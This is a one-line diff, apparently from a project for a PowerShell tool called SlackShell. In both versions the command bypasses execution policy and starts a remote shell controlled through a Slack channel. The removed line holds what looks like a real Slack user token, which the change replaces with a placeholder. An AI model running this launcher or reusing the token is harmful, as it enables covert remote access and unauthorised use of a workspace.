@@ -1,1 +1,1 @@
-powershell.exe -exec bypass -Command "& {Import-Module ./SlackShellv1.1.psm1; Start-Shell -Token "xoxp-650818730853-650818731893-644540174145-a84a0d040f733c5c1efc96fc8328b2fd" -Channel "CK70L88G6" -Sleep 5}"
+powershell.exe -exec bypass -Command "& {Import-Module ./SlackShellv1.1.psm1; Start-Shell -Token "blablabla" -Channel "CK70L88G6" -Sleep 5}"
